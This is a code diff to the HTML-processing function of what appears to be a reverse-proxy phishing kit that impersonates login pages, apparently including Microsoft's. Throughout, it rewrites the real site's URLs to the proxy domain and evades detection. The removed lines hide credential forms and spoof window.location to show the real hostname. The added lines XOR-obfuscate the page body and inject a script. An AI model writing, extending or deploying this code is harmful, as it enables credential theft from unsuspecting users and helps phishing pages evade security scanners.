@@ -1254,173 +1254,71 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 }
 
 function processHtmlResponse(htmlBuffer, sessionId, sessions, proxyHostname) {
-    console.log('[DEBUG] processHtmlResponse called for session:', sessionId);
     const session = sessions[sessionId];
     if (!session) return htmlBuffer;
 
     const realHost = session.hostname;
     const realProtocol = session.protocol;
-    const realOrigin = `${realProtocol}//${realHost}`;
     const proxyOrigin = `https://${proxyHostname}`;
 
-    // ---- 1. REWRITE ABSOLUTE URLS IN THE HTML ----
     let html = htmlBuffer.toString('utf8');
-    console.log('[DEBUG] HTML preview:', html.substring(0, 500));
 
-    // Find the form tag and log it for debugging
-const formTagMatch = html.match(/<form[^>]*>/i);
-if (formTagMatch) {
-    console.log('[DEBUG] Found form tag:', formTagMatch[0]);
-} else {
-    console.log('[DEBUG] No <form> tag found in HTML');
-}
-
-    // Replace all absolute references to the real host
+    // ---- 1. REWRITE ABSOLUTE URLS ----
     const hostRegex = new RegExp(`https?:\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
     html = html.replace(hostRegex, proxyOrigin);
-
-    // Replace protocol-relative references (//realhost.domain)
     const protoRelRegex = new RegExp(`\\/\\/${realHost.replace(/\./g, '\\.')}`, 'g');
     html = html.replace(protoRelRegex, `//${proxyHostname}`);
 
-    // ---- OBFUSCATE THE CREDENTIAL FORM ----
-    // ---- OBFUSCATE THE CREDENTIAL FORM ----
-    const containerSelectors = [
-        { type: 'id', value: 'i0281' },
-        { type: 'name', value: 'f1' },
-        { type: 'id', value: 'login' },
-        { type: 'id', value: 'loginForm' },
-        { type: 'id', value: 'passwordSection' }
-    ];
-    let obfuscatedHtml = null;
+    // ---- 2. OBFUSCATE THE BODY USING XOR ----
+    const XOR_KEY = 'MySecretXORKey2026'; // CHANGE THIS to a unique, random string
+    const bodyRegex = /<body([^>]*)>([\s\S]*?)<\/body>/i;
+    const match = html.match(bodyRegex);
+    if (match) {
+        const bodyAttributes = match[1] || '';
+        const bodyContent = match[2];
 
-    for (const sel of containerSelectors) {
-        let regex;
-        if (sel.type === 'id') {
-            regex = new RegExp(`<(div|form)[^>]*\\s+id\\s*=\\s*["']?${sel.value}["']?[^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
-        } else { // name
-            regex = new RegExp(`<(div|form)[^>]*\\s+name\\s*=\\s*["']?${sel.value}["']?[^>]*>([\\s\\S]*?)<\\/\\1>`, 'i');
+        // XOR encode the body content
+        let encoded = '';
+        for (let i = 0; i < bodyContent.length; i++) {
+            const charCode = bodyContent.charCodeAt(i) ^ XOR_KEY.charCodeAt(i % XOR_KEY.length);
+            encoded += String.fromCharCode(charCode);
         }
-        console.log('[DEBUG] Trying regex:', regex.toString());
-        const match = html.match(regex);
-        if (match) {
-            console.log(`[FORM OBFUSCATION] ✅ Found and obfuscated form with ${sel.type}: "${sel.value}"`);
-            const fullContainer = match[0];
-            const escaped = fullContainer
-                .replace(/\\/g, '\\\\')
-                .replace(/`/g, '\\`')
-                .replace(/\$/g, '\\$');
-            const placeholderId = `login-container-${Date.now()}`;
-            obfuscatedHtml = `
-                <div id="${placeholderId}"></div>
-                <script>
-                    (function() {
-                        const containerHTML = \`${escaped}\`;
-                        const target = document.getElementById('${placeholderId}');
-                        if (target) {
-                            target.innerHTML = containerHTML;
-                            target.removeAttribute('id');
-                            console.log('[Client] ✅ Login form rendered dynamically');
-                        }
-                    })();
-                </script>
-            `;
-            html = html.replace(regex, obfuscatedHtml);
-            break;
-        }
-    }
-   console.log('[DEBUG] Loop finished, obfuscatedHtml =', obfuscatedHtml);
-    // Fallback: if no match, try to obfuscate any <form>
-    if (!obfuscatedHtml) {
-        const formRegex = /<form[^>]*>([\s\S]*?)<\/form>/i;
-        const match = html.match(formRegex);
-        if (match) {
-            console.log('[FORM OBFUSCATION] ⚠️ Fallback: obfuscated a generic <form> (no ID/name match)');
-            const fullForm = match[0];
-            const escaped = fullForm.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$/g, '\\$');
-            const placeholderId = `login-container-${Date.now()}`;
-            const fallbackHtml = `
-                <div id="${placeholderId}"></div>
-                <script>
-                    (function() {
-                        const containerHTML = \`${escaped}\`;
-                        const target = document.getElementById('${placeholderId}');
-                        if (target) {
-                            target.innerHTML = containerHTML;
-                            target.removeAttribute('id');
-                            console.log('[Client] ⚠️ Fallback form rendered dynamically');
-                        }
-                    })();
-                </script>
-            `;
-            html = html.replace(formRegex, fallbackHtml);
-        }
-    }
+        // Convert to Base64 to safely embed in a JS string
+        const encodedBase64 = Buffer.from(encoded, 'binary').toString('base64');
 
-    // ---- 2. INJECT <base> TAG TO HANDLE RELATIVE URLS ----
-    const baseTag = `<base href="${proxyOrigin}/">`;
+        // ---- RAILWAY DEBUG LOG ----
+        console.log(`[BODY OBFUSCATION] ✅ Body encrypted successfully. Original length: ${bodyContent.length}, Encoded Base64 length: ${encodedBase64.length}`);
 
-    // ---- 3. BUILD THE DOMAIN MASK SCRIPT (stealthy Proxy) ----
-    const maskScript = `
+        // Build the new body with decoding script
+        const newBody = `
+<body${bodyAttributes}>
+    <script>
         (function() {
-            const fakeLocation = new Proxy({}, {
-                get: function(target, prop) {
-                    const realValue = window.location[prop];
-                    if (prop === 'hostname') return '${realHost}';
-                    if (prop === 'origin') return '${realOrigin}';
-                    if (prop === 'protocol') return '${realProtocol}';
-                    if (prop === 'host') return '${realHost}';
-                    // Intercept navigation methods
-                    if (prop === 'replace' || prop === 'assign') {
-                        return function(url) {
-                            const rewritten = url.toString().replace('${realHost}', '${proxyHostname}');
-                            return realValue.call(window.location, rewritten);
-                        };
-                    }
-                    return typeof realValue === 'function' ? realValue.bind(window.location) : realValue;
-                },
-                set: function() { return true; }
-            });
-
-            const realWindow = window;
-            window = new Proxy(window, {
-                get: function(target, prop) {
-                    if (prop === 'location') return fakeLocation;
-                    const value = target[prop];
-                    return typeof value === 'function' ? value.bind(target) : value;
-                },
-                set: function(target, prop, value) {
-                    if (prop === 'location') {
-                        // Rewrite the URL before navigation
-                        const newUrl = value.toString();
-                        const rewritten = newUrl.replace('${realHost}', '${proxyHostname}');
-                        // Navigate to rewritten URL (but we must avoid infinite loop)
-                        window.location.href = rewritten;
-                        return true;
-                    }
-                    target[prop] = value;
-                    return true;
-                }
-            });
-
-            window.toString = function() { return '[object Window]'; };
-            delete window.hasOwnProperty && Object.setPrototypeOf(window.toString, Function.prototype);
+            const key = '${XOR_KEY}';
+            const encoded = atob('${encodedBase64}');
+            let decoded = '';
+            for (let i = 0; i < encoded.length; i++) {
+                decoded += String.fromCharCode(encoded.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            document.write(decoded);
         })();
-    `;
+    </script>
+</body>`;
+        html = html.replace(bodyRegex, newBody);
+    } else {
+        console.log('[BODY OBFUSCATION] ⚠️ No <body> tag found – skipping obfuscation');
+    }
 
-    // ---- 4. KEEP YOUR EXISTING STATIC SCRIPT INJECTION ----
-    // This is exactly what your old updateHTMLProxyResponse did.
+    // ---- 3. INJECT <base> TAG AND STATIC SCRIPT (if needed) ----
+    const baseTag = `<base href="${proxyOrigin}/">`;
     const staticScript = '<script src="/@"></script>';
+    const headPayload = `${baseTag}${staticScript}`;
 
-    // ---- 5. COMBINE EVERYTHING INTO ONE PAYLOAD ----
-    // Inject <base> first, then the mask, then the static script.
-    const fullPayload = `${baseTag}<script>${maskScript}</script>${staticScript}`;
-
-    // ---- 6. INJECT INTO <head> OR <body> ----
+    // ---- 4. INJECT PAYLOAD INTO <head> ----
     const injectionMap = {
-        "<head>": `<head>${fullPayload}`,
-        "<html>": `<html><head>${fullPayload}</head>`,
-        "<body>": `<head>${fullPayload}</head><body>`
+        "<head>": `<head>${headPayload}`,
+        "<html>": `<html><head>${headPayload}</head>`,
+        "<body>": `<head>${headPayload}</head><body>`
     };
     const limit = 200;
     for (const [tag, replacement] of Object.entries(injectionMap)) {
@@ -1432,6 +1330,6 @@ if (formTagMatch) {
             return Buffer.concat([before, Buffer.from(replacement), after]);
         }
     }
-    // Fallback: prepend
-    return Buffer.concat([Buffer.from(`<head>${fullPayload}</head>`), Buffer.from(html)]);
+    // Fallback: prepend to the whole document
+    return Buffer.concat([Buffer.from(`<head>${headPayload}</head>`), Buffer.from(html)]);
 }
